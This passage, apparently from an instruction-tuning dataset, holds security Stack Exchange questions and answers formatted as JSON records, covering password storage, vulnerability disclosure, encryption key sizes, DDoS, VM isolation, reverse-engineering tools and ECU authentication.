      "answer": "You are wrong in your assumption that protonmail stores the password used for the encryption of your private key.\nProtonmail uses the Secure Remote Password Protocol (SRP on wikipedia - Protonmail blog post about SRP) and so they only store a verifier that is irreversibility related to your password.\nWhen entering your password on the login form of protonmail, some javascript is executed client side and generates this verifier that it sends to protonmail.\nUpon verification, protonmail returns the encrypted version of your private key which then gets decrypted client side using your password. This private key is then used to decrypt your emails."
    }
  },
  {
    "instruction": "Q: Protecting Password Hashes with Stored Procedures?\nI was thinking about the recent (seemingly weekly) security breaches we've seen where millions of password hashes have been leaked and I was wondering how one might secure their site against a password dump, even if a hacker found a SQL injection vulnerability.\nWhat if the user the website was using to log into the database had more limited permissions. Let's say on all non-critical data the user had full permissions like normal (CRUD). But what if the user was denied all CRUD operations to the table that stored the login hashes, security questions, etc, and could only run stored procedures on that table. And let's say those stored procedures never returned the password hashes to the application layer, but rather you would pass the hash to the procedure and the procedure would return a boolean value indicating whether there was a match.\nIt seems to me that this setup would eliminate the possibility of a password hash dump through SQL injection entirely. Does this setup provide additional security, is it advisable?\n\nUpdate\nPlease see this question for more details:\nWorthwhile from security standpoint to limit database server user for ASP.NET website to only EXECUTE on stored procedures?",
    "context": "",
    "output": " A: The scheme you describe is similar in concept to making a dedicated password verification server (local server, not open to the world at large) with its own, completely distinct database for the storage of hashed passwords. This can work. Actually you already have that under the guise of \"system integration\" when the user accounts are mapped, for instance, to an Active Directory server, or local Unix accounts.\nUsing a stored procedure in the database for that, relies on the database enforcing appropriate isolation -- a somewhat risky bet, since you are envisioning a situation where the attacker gets to include his own SQL statements.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Protecting Password Hashes with Stored Procedures?\nI was thinking about the recent (seemingly weekly) security breaches we've seen where millions of password hashes have been leaked and I was wondering how one might secure their site against a password dump, even if a hacker found a SQL injection vulnerability.\nWhat if the user the website was using to log into the database had more limited permissions. Let's say on all non-critical data the user had full permissions like normal (CRUD). But what if the user was denied all CRUD operations to the table that stored the login hashes, security questions, etc, and could only run stored procedures on that table. And let's say those stored procedures never returned the password hashes to the application layer, but rather you would pass the hash to the procedure and the procedure would return a boolean value indicating whether there was a match.\nIt seems to me that this setup would eliminate the possibility of a password hash dump through SQL injection entirely. Does this setup provide additional security, is it advisable?\n\nUpdate\nPlease see this question for more details:\nWorthwhile from security standpoint to limit database server user for ASP.NET website to only EXECUTE on stored procedures?",
      "answer": "The scheme you describe is similar in concept to making a dedicated password verification server (local server, not open to the world at large) with its own, completely distinct database for the storage of hashed passwords. This can work. Actually you already have that under the guise of \"system integration\" when the user accounts are mapped, for instance, to an Active Directory server, or local Unix accounts.\nUsing a stored procedure in the database for that, relies on the database enforcing appropriate isolation -- a somewhat risky bet, since you are envisioning a situation where the attacker gets to include his own SQL statements."
    }
  },
  {
    "instruction": "Answer the following question:\n\nHow to contact a tech company's CERT?\nGiven I discovered a vulnerability in a product, e.g. a networking product, and can't find the email address of neither their CERT nor a disclosure contact, how should I report the vulnerability? Should I contact the first level tech support and ask for the address? Should I send them a problem description and hope the ticket gets escalated?",
    "context": "",
    "output": "As requested, I'm making this an answer:\nYou could either\n\ncontact your countries CERT\ncontact the CERT of the manufacturer's country.\n\nHopefully, they will forward the information appropriately.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to contact a tech company's CERT?\nGiven I discovered a vulnerability in a product, e.g. a networking product, and can't find the email address of neither their CERT nor a disclosure contact, how should I report the vulnerability? Should I contact the first level tech support and ask for the address? Should I send them a problem description and hope the ticket gets escalated?",
      "answer": "As requested, I'm making this an answer:\nYou could either\n\ncontact your countries CERT\ncontact the CERT of the manufacturer's country.\n\nHopefully, they will forward the information appropriately."
    }
  },
  {
    "instruction": "Q: Why most people use 256 bit encryption instead of 128 bit?\nIsn't 128 bit security enough for most practical applications?",
    "context": "",
    "output": " A: I didn't see this mentioned in the answers or comments so I thought to add this as an answer. Key size does not always correlate directly to complexity of an algorithm.  A common fallacy is to assume that a message encrypted using AES256 is more difficult to crack (an adversary getting any sort of meaning information given only the ciphertext) than the same information protected using AES128.  It makes logical sense that a larger key size provide introduces greater complexity but as with any systems, implementations are subject to weaknesses.  \nAssuming you're talking about AES 128 versus AES 256, there is a known weakness in the key expansion function that affects AES256.  Fundamentally, the weakness reduces the complexity of AES256 to that lower than AES128.  There's a similar attack for AES192 as well, though in this case, the complexity of AES192 remains greater than AES128.  \nMoral of the story, people don't understand crypto... j/k (I'm not a mathematician).  Reality is that people assume \"big\" with \"secure.\"  A big gun is better than having a small gun. Larger key sizes are more secure than smaller key sizes.\nIn reality, the implementation of crypto is more important than key size alone.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Why most people use 256 bit encryption instead of 128 bit?\nIsn't 128 bit security enough for most practical applications?",
      "answer": "I didn't see this mentioned in the answers or comments so I thought to add this as an answer. Key size does not always correlate directly to complexity of an algorithm.  A common fallacy is to assume that a message encrypted using AES256 is more difficult to crack (an adversary getting any sort of meaning information given only the ciphertext) than the same information protected using AES128.  It makes logical sense that a larger key size provide introduces greater complexity but as with any systems, implementations are subject to weaknesses.  \nAssuming you're talking about AES 128 versus AES 256, there is a known weakness in the key expansion function that affects AES256.  Fundamentally, the weakness reduces the complexity of AES256 to that lower than AES128.  There's a similar attack for AES192 as well, though in this case, the complexity of AES192 remains greater than AES128.  \nMoral of the story, people don't understand crypto... j/k (I'm not a mathematician).  Reality is that people assume \"big\" with \"secure.\"  A big gun is better than having a small gun. Larger key sizes are more secure than smaller key sizes.\nIn reality, the implementation of crypto is more important than key size alone."
    }
  },
  {
    "instruction": "How is DDoS different from DRDoS?\nI understand DDoS is a DoS assault from multiple sources, where a coordinated stream of requests is launched against a target.\nHow is DRDoS different?",
    "context": "",
    "output": "To put it straight and simple, DDOS is is making the server unavailable or denying the service to the users for a particular time.\nDRDOS is sending forged requests imitating the target (victim) to millions of computers and making the target flooded by the responses from those computers.\n\nMore info on DRDOS\nThe attacker sends the requests from his server. Using IP address spoofing, the source address is set to that of the targeted victim, which means all the replies will go to (and flood) the target.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How is DDoS different from DRDoS?\nI understand DDoS is a DoS assault from multiple sources, where a coordinated stream of requests is launched against a target.\nHow is DRDoS different?",
      "answer": "To put it straight and simple, DDOS is is making the server unavailable or denying the service to the users for a particular time.\nDRDOS is sending forged requests imitating the target (victim) to millions of computers and making the target flooded by the responses from those computers.\n\nMore info on DRDOS\nThe attacker sends the requests from his server. Using IP address spoofing, the source address is set to that of the targeted victim, which means all the replies will go to (and flood) the target."
    }
  },
  {
    "instruction": "Answer the question below.\nHow can I stop this attack on my router?\nAfter enabling system log on my Asus DSL-N10E router, I've got this message:\n\nDoS: Tcp SYN With Data Attack source=217.74.166.73\n\nWhat does it mean? Is it a real danger on my network security? And how can I protect my network from these attacks?",
    "context": "",
    "output": "This is very likely not a Denial of Service attack. As a matter of fact, this looks very much like a SYN Port Scan. Someone (very likely automated, by an infected machine) is attempting to scan your machine. They send a SYN packet to you on a certain port, then your machine responds with an ACK packet.\nThere's no real danger here. This is the Internet; someone will always try to scan your machine and try to infect you. Outside of books and in real life, nobody really is going to DoS your home router. Your router is already doing a good job by detecting and DROPing those packets.\nMy advice: Forget about this, and move on with your life.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How can I stop this attack on my router?\nAfter enabling system log on my Asus DSL-N10E router, I've got this message:\n\nDoS: Tcp SYN With Data Attack source=217.74.166.73\n\nWhat does it mean? Is it a real danger on my network security? And how can I protect my network from these attacks?",
      "answer": "This is very likely not a Denial of Service attack. As a matter of fact, this looks very much like a SYN Port Scan. Someone (very likely automated, by an infected machine) is attempting to scan your machine. They send a SYN packet to you on a certain port, then your machine responds with an ACK packet.\nThere's no real danger here. This is the Internet; someone will always try to scan your machine and try to infect you. Outside of books and in real life, nobody really is going to DoS your home router. Your router is already doing a good job by detecting and DROPing those packets.\nMy advice: Forget about this, and move on with your life."
    }
  },
  {
    "instruction": "Question: Security of a desktop application's source code\nHow easy is it to get the source code from a desktop application? \nAre there any protections in place to stop someone from viewing an application's code?",
    "context": "",
    "output": "Answer: How easy is it to get the source code from a desktop application?\n\nIf it is open source software it is easy. If not it is harder.\n\nAre there any protections in place to stop someone from viewing an application's code?\n\nThis depends on the software. Usually you cannot get the full source back because in the process of compiling the original source is translated to machine code or byte code. But you can often decompile the code to get at least an idea how this software works and find bugs in it (i.e. reverse engineering). Some applications have added obfuscation and other methods to make reverse engineering harder.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Security of a desktop application's source code\nHow easy is it to get the source code from a desktop application? \nAre there any protections in place to stop someone from viewing an application's code?",
      "answer": "How easy is it to get the source code from a desktop application?\n\nIf it is open source software it is easy. If not it is harder.\n\nAre there any protections in place to stop someone from viewing an application's code?\n\nThis depends on the software. Usually you cannot get the full source back because in the process of compiling the original source is translated to machine code or byte code. But you can often decompile the code to get at least an idea how this software works and find bugs in it (i.e. reverse engineering). Some applications have added obfuscation and other methods to make reverse engineering harder."
    }
  },
  {
    "instruction": "Can you tell me the answer to: How can I safely back-up files from an infected computer?\nImagine a laptop that's been infected by malware, and that the owner hasn't backed-up their files.* They have pictures, videos, and documents they'd like to preserve, so they're hesitant to immediately nuke it from orbit.\nThe objective is to back-up the files they wish to keep before wiping their machine, but how can they know that one of their files isn't infected? A common suggestion I've seen here is scanning said files after moving them to an external hard drive, for example, and then moving them back to the machine which has just been wiped. In this case, the concern is the malware evades detection and restoration reinfects their computer.\nHow can the user safely back-up files from an infected machine so that they avoid reinfection when transferring them to a clean machine?\n\n*By \"files,\" I mean documents, images, video, programming projects, etc.; not system files, like registry settings and scripts.",
    "context": "",
    "output": "answer: \"How can they know that one of their files isn't infected\"?  You can't.  Well you can if you get down into the bits of the file, but that's pretty tedious and expensive.\nIf you have an idea of the date the device got infected, files not altered before that date stand a higher chance of not being infected.  That's not a guarantee, because changing a file's date isn't hard.  So even that's not foolproof.  \nReally the only halfway decent option is to scan the file, copy it to an external drive, then scan it again and copy it back.  Odds are that it's a generic and not a targeted infection.  By waiting a couple days, to give AV vendors time to update their virus definitions, you stand a better chance of removing the infection when you move and scan the files.  That's not 100%, though - unless you know the infection and that the AV in question resolves the infection, you could set yourself up for a reinfection.\nThe only safe alternative is to wipe everything and have the user buy an external hard drive.  Then they should use it regularly to back their files up.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How can I safely back-up files from an infected computer?\nImagine a laptop that's been infected by malware, and that the owner hasn't backed-up their files.* They have pictures, videos, and documents they'd like to preserve, so they're hesitant to immediately nuke it from orbit.\nThe objective is to back-up the files they wish to keep before wiping their machine, but how can they know that one of their files isn't infected? A common suggestion I've seen here is scanning said files after moving them to an external hard drive, for example, and then moving them back to the machine which has just been wiped. In this case, the concern is the malware evades detection and restoration reinfects their computer.\nHow can the user safely back-up files from an infected machine so that they avoid reinfection when transferring them to a clean machine?\n\n*By \"files,\" I mean documents, images, video, programming projects, etc.; not system files, like registry settings and scripts.",
      "answer": "\"How can they know that one of their files isn't infected\"?  You can't.  Well you can if you get down into the bits of the file, but that's pretty tedious and expensive.\nIf you have an idea of the date the device got infected, files not altered before that date stand a higher chance of not being infected.  That's not a guarantee, because changing a file's date isn't hard.  So even that's not foolproof.  \nReally the only halfway decent option is to scan the file, copy it to an external drive, then scan it again and copy it back.  Odds are that it's a generic and not a targeted infection.  By waiting a couple days, to give AV vendors time to update their virus definitions, you stand a better chance of removing the infection when you move and scan the files.  That's not 100%, though - unless you know the infection and that the AV in question resolves the infection, you could set yourself up for a reinfection.\nThe only safe alternative is to wipe everything and have the user buy an external hard drive.  Then they should use it regularly to back their files up."
    }
  },
  {
    "instruction": "Answer this question:\n\nCan Apple Devices Give Away Location to Hackers?\nIn a hypothetical scenario, I am travelling with my iPhone to, let's say, New Zealand. I stop at some random hotel and simply stay there doing nothing but staring at a wall for days with no interaction with my phone whatsoever.\nIs it possible for hackers/organizations that are targeting me specifically to find my exact/relative location? Would it help if I turned off location services or used a VPN with a killswitch? How would the situation change if, instead of an iPhone that I used for a year, I travelled with a brand new iPhone, or with a Macbook?\nThanks in advance",
    "context": "",
    "output": "A: Theoretically, yes they could track you, provided your phone was turned on.  There are actually several potential ways for them to do it, but they vary in terms of the level of sophistication (i.e. how technically advanced they are and the amount of money they have to spend).    \nFor a more technically sophisticated attacker, the protocol which mobile phone use, Subsystem number 7 (SS7), has known vulnerabilities which could allow an attacker to locate you.  \nIf they have access to your iCloud account, they could potentially use the device location feature to find your location.  \nIf they have already compromised your phone/laptop, a VPN won't do you any good.  The attacker could potentially access your phone/machine, see what wifi networks are nearby, and use that to geolocate you.  \nTravelling with that new iPhone/macbook will only help if the attacker is not able to link you as an individual to those new devices.  How easy it is to link you to a device is going to depend on the sophistication of an attacker.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Can Apple Devices Give Away Location to Hackers?\nIn a hypothetical scenario, I am travelling with my iPhone to, let's say, New Zealand. I stop at some random hotel and simply stay there doing nothing but staring at a wall for days with no interaction with my phone whatsoever.\nIs it possible for hackers/organizations that are targeting me specifically to find my exact/relative location? Would it help if I turned off location services or used a VPN with a killswitch? How would the situation change if, instead of an iPhone that I used for a year, I travelled with a brand new iPhone, or with a Macbook?\nThanks in advance",
      "answer": "Theoretically, yes they could track you, provided your phone was turned on.  There are actually several potential ways for them to do it, but they vary in terms of the level of sophistication (i.e. how technically advanced they are and the amount of money they have to spend).    \nFor a more technically sophisticated attacker, the protocol which mobile phone use, Subsystem number 7 (SS7), has known vulnerabilities which could allow an attacker to locate you.  \nIf they have access to your iCloud account, they could potentially use the device location feature to find your location.  \nIf they have already compromised your phone/laptop, a VPN won't do you any good.  The attacker could potentially access your phone/machine, see what wifi networks are nearby, and use that to geolocate you.  \nTravelling with that new iPhone/macbook will only help if the attacker is not able to link you as an individual to those new devices.  How easy it is to link you to a device is going to depend on the sophistication of an attacker."
    }
  },
  {
    "instruction": "Answer this question:\n\nHow to get access token programatically when we try to authorize by grand_type auth-code in the OAuth 2.0 like a user?\nThere is a bank service that provides API to do some operations with bank accounts. To perform a request to all endpoints of this service I, first of all, need to get auth token via grand_type=auth_code; I can easily get the auth code and then access token manually. When browser redirects me to bank auth page I just enter my credentials and then It redirects me to my predefined URL with auth_code.\nBut I need to write unit tests for my implementation of this API. And how can I perform this process with entering credentials and send request from the page programmatically to get auth code?",
    "context": "",
    "output": "A: You can try to use Selenium WebDriver to automate the flow. \nI recently did exactly that - automated integration tests calling bank API protected by OAuth and it took me only few hours to get it to work.\nBasically You run a real browser and drive interaction with web page from Java code replicating manual interaction.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to get access token programatically when we try to authorize by grand_type auth-code in the OAuth 2.0 like a user?\nThere is a bank service that provides API to do some operations with bank accounts. To perform a request to all endpoints of this service I, first of all, need to get auth token via grand_type=auth_code; I can easily get the auth code and then access token manually. When browser redirects me to bank auth page I just enter my credentials and then It redirects me to my predefined URL with auth_code.\nBut I need to write unit tests for my implementation of this API. And how can I perform this process with entering credentials and send request from the page programmatically to get auth code?",
      "answer": "You can try to use Selenium WebDriver to automate the flow. \nI recently did exactly that - automated integration tests calling bank API protected by OAuth and it took me only few hours to get it to work.\nBasically You run a real browser and drive interaction with web page from Java code replicating manual interaction."
    }
  },
  {
    "instruction": "Please answer this question: Native rsync protocol security\nIs the native rsync protocol (port 873) secure? Does it encrypt data or credentials?\nI'm planning on using rsync to store encrypted files in the cloud, I'm wondering whatever the password is transferred in clear.",
    "context": "",
    "output": "The native rsync protocol does not encrypt anything. It is meant only for trusted networks.\nTo use rsync in a secure way, use it with SSH (see the \"-e\" command-line option) or over a VPN.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Native rsync protocol security\nIs the native rsync protocol (port 873) secure? Does it encrypt data or credentials?\nI'm planning on using rsync to store encrypted files in the cloud, I'm wondering whatever the password is transferred in clear.",
      "answer": "The native rsync protocol does not encrypt anything. It is meant only for trusted networks.\nTo use rsync in a secure way, use it with SSH (see the \"-e\" command-line option) or over a VPN."
    }
  },
  {
    "instruction": "Q: How to disable CBC-mode ciphers\nIs there a simple allowlist-style way of disabling CBC mode cipher suites in apps that use an openssl cipher suite list? I'm hoping for something in the style of !RC4, however, !CBC has no effect, and still allows suites such as TLS_DHE_RSA_WITH_AES_128_CBC_SHA256.\nThe only solution I've found so far is to use a much more verbose allowlist that only includes non-CBC ciphers. Is there a simpler alternative?",
    "context": "",
    "output": " A: According to the list of Cipher Strings given in the documentation (man ciphers) there is no string describing all CBC ciphers. This means there is no simple way to disable all of these (and only these) with a simple !CBC or similar.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to disable CBC-mode ciphers\nIs there a simple allowlist-style way of disabling CBC mode cipher suites in apps that use an openssl cipher suite list? I'm hoping for something in the style of !RC4, however, !CBC has no effect, and still allows suites such as TLS_DHE_RSA_WITH_AES_128_CBC_SHA256.\nThe only solution I've found so far is to use a much more verbose allowlist that only includes non-CBC ciphers. Is there a simpler alternative?",
      "answer": "According to the list of Cipher Strings given in the documentation (man ciphers) there is no string describing all CBC ciphers. This means there is no simple way to disable all of these (and only these) with a simple !CBC or similar."
    }
  },
  {
    "instruction": "Please answer this question: Run program until completion without debugging step by step\nI am debugging a program but I no longer want to run step by step. Is there no \"resume program\" function that I can use to let the program I'm attached to, to run to completion of all its tasks without the debugger pausing every second (no breakpoints enabled). Maybe the access violations are why it's pausing but I want it to ignore them too as it's already excluded in my exceptions menu.",
    "context": "",
    "output": "In both, ollydbg and x64dbg you can just press the \"run\" button(or F9) to let the programm run normally. You may have to disable the breakpoints beforehand(This will not delete them). In x64dbg you do a right click in the breakpoints panel and select \"disable all\" in the context menu to achieve this.\nTo \"ignore\" all exceptions in x64dbg: Click on options -> preferences -> exceptions -> add range. Then in the first input enter a \"0\" and in the second as many \"F\" as fit in.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Run program until completion without debugging step by step\nI am debugging a program but I no longer want to run step by step. Is there no \"resume program\" function that I can use to let the program I'm attached to, to run to completion of all its tasks without the debugger pausing every second (no breakpoints enabled). Maybe the access violations are why it's pausing but I want it to ignore them too as it's already excluded in my exceptions menu.",
      "answer": "In both, ollydbg and x64dbg you can just press the \"run\" button(or F9) to let the programm run normally. You may have to disable the breakpoints beforehand(This will not delete them). In x64dbg you do a right click in the breakpoints panel and select \"disable all\" in the context menu to achieve this.\nTo \"ignore\" all exceptions in x64dbg: Click on options -> preferences -> exceptions -> add range. Then in the first input enter a \"0\" and in the second as many \"F\" as fit in."
    }
  },
  {
    "instruction": "Answer the question below.\nHost an application on a virtualbox?\nI want to host an application locally, but I was worried about security of my local files. I decided to 'encapsulate' the application using VirtualBox.\nIs that safe for my host OS (Windows)?",
    "context": "",
    "output": "Yes and No .... But mostly no (Actually Hell no).\nVirtualisation systems such as workstation or virtualbox are type II hypervisors which run inside of your Host OS, as with a regular processes (like any other program). This means that they use the Host OS's services for things like; networking, outputting graphics, and your I/O devices such as your keyboard and mouse input. Which implies that any given VM is only as secure as your hosting OS. If the hosting OS got compromised ... game over, for both your OS and your VMs.\nBut this is all kind of the opposite of what you are asking .... So to get to the point.\nThese type II hypervisors are not designed with security or isolation mind, but instead ease-of-use, performance and seamless integration with the guest OS(s). Not to mention the lack of a trusted window manager and the god awful idea of 'shared clipboards' so you can infect everything through that too YAY!\nBut by all means use those VM's for your un-trusted activities but I recommend you use an external network Adapter such as an 'alfa awus036h', disable the clipboard (if that's an option) and only enable your VM manager to use specific USB devices. \nAlso If you are only testing tools and SW you're not entirely certain about ignore everything I just said AHAAH and I'll say for what your doing its just fine but you could use an sandbox such as :\nSandboxie - Trust no programs\nHope this helps, Enjoy!",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Host an application on a virtualbox?\nI want to host an application locally, but I was worried about security of my local files. I decided to 'encapsulate' the application using VirtualBox.\nIs that safe for my host OS (Windows)?",
      "answer": "Yes and No .... But mostly no (Actually Hell no).\nVirtualisation systems such as workstation or virtualbox are type II hypervisors which run inside of your Host OS, as with a regular processes (like any other program). This means that they use the Host OS's services for things like; networking, outputting graphics, and your I/O devices such as your keyboard and mouse input. Which implies that any given VM is only as secure as your hosting OS. If the hosting OS got compromised ... game over, for both your OS and your VMs.\nBut this is all kind of the opposite of what you are asking .... So to get to the point.\nThese type II hypervisors are not designed with security or isolation mind, but instead ease-of-use, performance and seamless integration with the guest OS(s). Not to mention the lack of a trusted window manager and the god awful idea of 'shared clipboards' so you can infect everything through that too YAY!\nBut by all means use those VM's for your un-trusted activities but I recommend you use an external network Adapter such as an 'alfa awus036h', disable the clipboard (if that's an option) and only enable your VM manager to use specific USB devices. \nAlso If you are only testing tools and SW you're not entirely certain about ignore everything I just said AHAAH and I'll say for what your doing its just fine but you could use an sandbox such as :\nSandboxie - Trust no programs\nHope this helps, Enjoy!"
    }
  },
  {
    "instruction": "Answer the question below.\nThe most secure way to handle someone forgetting to verify their account?\nSuppose we send out email verification to new subscribers that where they have to click on a link to verify their account.\nSuppose they forget to verify it, and later try to login.\nShould the error message say \"Your user name or password is incorrect?\", instead of letting them know that they have forgotten to verify the account.\nI assume this is the most secure way of handling it, because if we tell them that they have to verify the account, we are letting them know that an account with that userid exists ...\nThoughts?\nPerhaps the best way to handle it is to allow them to access the account, but don't let them do anything in it until they are verified?",
    "context": "",
    "output": "What I see most commonly is allowing the authentication and signing the user in, but locking meaningful features away until the email is verified. You should bubble up an error reminding the user to re-send an activation email if they try to access one of the restricted features. \nIt is poor design to ever lie to a user - if they submit the correct username and password, you should never show an error claiming that either is incorrect.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "The most secure way to handle someone forgetting to verify their account?\nSuppose we send out email verification to new subscribers that where they have to click on a link to verify their account.\nSuppose they forget to verify it, and later try to login.\nShould the error message say \"Your user name or password is incorrect?\", instead of letting them know that they have forgotten to verify the account.\nI assume this is the most secure way of handling it, because if we tell them that they have to verify the account, we are letting them know that an account with that userid exists ...\nThoughts?\nPerhaps the best way to handle it is to allow them to access the account, but don't let them do anything in it until they are verified?",
      "answer": "What I see most commonly is allowing the authentication and signing the user in, but locking meaningful features away until the email is verified. You should bubble up an error reminding the user to re-send an activation email if they try to access one of the restricted features. \nIt is poor design to ever lie to a user - if they submit the correct username and password, you should never show an error claiming that either is incorrect."
    }
  },
  {
    "instruction": "Can an authoritative DNS server tell who is trying to resolve a domain name?\nLet's assume my domain example.com has ns1 record pointed to a random IP address 192.0.2.111.\nWhen somebody tries to resolve example.com, can the dns server at 192.0.2.111 see what IP is trying to resolve that domain name?",
    "context": "",
    "output": "Not exactly. Keep in mind you won't see requests from systems which either have the dns info cached or are using a dns server which has it cached. Likewise if you have someone visiting or attacking your site who is using an external dns server the dns query will likely come from the IP address of the dns server they are using and not the visitor/attackers IP itself. So you will see the query itself but it may come from a public DNS server.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Can an authoritative DNS server tell who is trying to resolve a domain name?\nLet's assume my domain example.com has ns1 record pointed to a random IP address 192.0.2.111.\nWhen somebody tries to resolve example.com, can the dns server at 192.0.2.111 see what IP is trying to resolve that domain name?",
      "answer": "Not exactly. Keep in mind you won't see requests from systems which either have the dns info cached or are using a dns server which has it cached. Likewise if you have someone visiting or attacking your site who is using an external dns server the dns query will likely come from the IP address of the dns server they are using and not the visitor/attackers IP itself. So you will see the query itself but it may come from a public DNS server."
    }
  },
  {
    "instruction": "Q: Reverse Engineering iOS Apps on a Mac OS X\nI want to learn to Reverse Engineer iOS Apps. I know exactly what I need to do and I've got almost everything set up. My iPhone is jailbroken, I have installed OpenSSH to SSH into the iPhone from my Mac and installed Cycript, otool and Clutch. Now the only thing holding me back is getting an Interactive Disassembler. Could you point me in the right direction of an IDA I could use on my Mac laptop that would feature most things and is very efficient?\nThanks.",
    "context": "",
    "output": " A: Your best options are IDA Pro and Hopper.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Reverse Engineering iOS Apps on a Mac OS X\nI want to learn to Reverse Engineer iOS Apps. I know exactly what I need to do and I've got almost everything set up. My iPhone is jailbroken, I have installed OpenSSH to SSH into the iPhone from my Mac and installed Cycript, otool and Clutch. Now the only thing holding me back is getting an Interactive Disassembler. Could you point me in the right direction of an IDA I could use on my Mac laptop that would feature most things and is very efficient?\nThanks.",
      "answer": "Your best options are IDA Pro and Hopper."
    }
  },
  {
    "instruction": "Answer the following question:\n\nExample Seed and Key Algorithm\nI am attempting to design a seed and key algorithm for an Engine Control Unit.  This is used to secure resources such as the ability to reprogram the ECU.  The idea is that I request a seed from the ECU, which it gives as a string of bytes.  Both the ECU and I perform some secret calculation to transform the seed value into a key value.  I then submit my calculated key to the ECU, and if it matches the ECU's calculation the resource is unlocked.\nI have been looking around for an example calculation to derive my own from, but so far I have just come up with resources merely describing the concept as above.  Does anyone have any concrete examples I could use?",
    "context": "",
    "output": "This is done a number of different ways, and no way is perfect.  Usually it involves a pre-shared key one way or another.\nHere's an example from General Motors that uses a remote database (assumed secure) to match two values, an ECU ID and a challenge, to a corresponding key value or algorithm (a non-reversible algorithm like a modulus operator).\n\nThe diagnostic PC sends a level 3 security access request\nThe ECU responds with an ID and a pseudorandom challenge\nThe diagnostic PC references the ID against a (remote?) database of ECUs and their security keys.\nThe diagnostic PC (or server, as in the GM implementation) calculates and sends a response (e.g. key mod challenge)\nThe ECU compares this to its own key mod challenge calculation and enters the desired run level if there is a match.\n\nThis approach will ensure that the challenge is different every time, which makes this process less vulnerable to eavesdropping.  However, larger security issues remain that aren't addressed (such as session hijacking).",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Example Seed and Key Algorithm\nI am attempting to design a seed and key algorithm for an Engine Control Unit.  This is used to secure resources such as the ability to reprogram the ECU.  The idea is that I request a seed from the ECU, which it gives as a string of bytes.  Both the ECU and I perform some secret calculation to transform the seed value into a key value.  I then submit my calculated key to the ECU, and if it matches the ECU's calculation the resource is unlocked.\nI have been looking around for an example calculation to derive my own from, but so far I have just come up with resources merely describing the concept as above.  Does anyone have any concrete examples I could use?",
      "answer": "This is done a number of different ways, and no way is perfect.  Usually it involves a pre-shared key one way or another.\nHere's an example from General Motors that uses a remote database (assumed secure) to match two values, an ECU ID and a challenge, to a corresponding key value or algorithm (a non-reversible algorithm like a modulus operator).\n\nThe diagnostic PC sends a level 3 security access request\nThe ECU responds with an ID and a pseudorandom challenge\nThe diagnostic PC references the ID against a (remote?) database of ECUs and their security keys.\nThe diagnostic PC (or server, as in the GM implementation) calculates and sends a response (e.g. key mod challenge)\nThe ECU compares this to its own key mod challenge calculation and enters the desired run level if there is a match.\n\nThis approach will ensure that the challenge is different every time, which makes this process less vulnerable to eavesdropping.  However, larger security issues remain that aren't addressed (such as session hijacking)."
    }
  },
  {
    "instruction": "Can you tell me the answer to: Is it possible to prove the content of an encrypted message without disclosing the private key?\nSuppose that I sent Bob a message saying, \"The meeting is cancelled\", and encrypted it with his public key.\nCould he share the plaintext with other people, without disclosing his private key (and therefore compromising the secrecy of the other messages)?\nI found this discussion, but I don't think it's a duplicate, or even relevant.",
    "context": "",
    "output": "answer: Yes, assuming there is no randomness added to the message during encryption (or that Bob reveals that randomness) then anyone who encrypts the plain-text message with Bob's public key will get the same cipher-text that Bob received / published. That is, of course, assuming that Bob can prove the cipher-text is genuine.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is it possible to prove the content of an encrypted message without disclosing the private key?\nSuppose that I sent Bob a message saying, \"The meeting is cancelled\", and encrypted it with his public key.\nCould he share the plaintext with other people, without disclosing his private key (and therefore compromising the secrecy of the other messages)?\nI found this discussion, but I don't think it's a duplicate, or even relevant.",
      "answer": "Yes, assuming there is no randomness added to the message during encryption (or that Bob reveals that randomness) then anyone who encrypts the plain-text message with Bob's public key will get the same cipher-text that Bob received / published. That is, of course, assuming that Bob can prove the cipher-text is genuine."
    }
  },
  {
    "instruction": "Please answer this question: Are there any tools or scripts for identifying compression algorithms in executables?\nI know there are tools for identifying common ciphers and hash algorithms in code, but are there any similar scripts / tools / plugins for common compression algorithms such as gzip, deflate, etc? Primarily aimed at x86 and Windows, but answers for other platforms are welcomed too.\nNote that I'm looking to find code, not data.",
    "context": "",
    "output": "signsrch by Luigi Auriemma has signatures for tables used in common compression libraries (zlib etc.). \n\nIt has been ported as plugins for ImmDbg and IDA.\nHe also has the offzip tool which tries to identify and unpack compressed streams inside a binary.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Are there any tools or scripts for identifying compression algorithms in executables?\nI know there are tools for identifying common ciphers and hash algorithms in code, but are there any similar scripts / tools / plugins for common compression algorithms such as gzip, deflate, etc? Primarily aimed at x86 and Windows, but answers for other platforms are welcomed too.\nNote that I'm looking to find code, not data.",
